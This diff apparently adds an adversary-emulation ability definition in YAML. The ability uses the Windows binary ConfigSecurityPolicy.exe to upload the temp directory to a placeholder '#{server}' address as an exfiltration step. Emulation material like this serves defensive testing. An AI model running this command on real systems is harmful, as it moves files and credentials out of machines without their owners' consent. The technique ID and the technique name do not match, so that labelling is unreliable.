@@ -1,0 +1,22 @@
+- id: 7630f597-16b1-cd0f-2298-2e003755b3ac
+  name: ConfigSecurityPolicy.exe - Upload file, credentials or data exfiltration in
+    general
+  description: Upload file, credentials or data exfiltration in general
+  tactic: exfiltration
+  technique:
+    attack_id: T1567
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'ConfigSecurityPolicy.exe #{host.dir.temp} #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - exfiltration
+  version: '1.0'
+  author: Ialle Teixeira
+  created: '2020-09-04'
+  modified: '2020-09-04'
+  operating_system: Windows All Versions
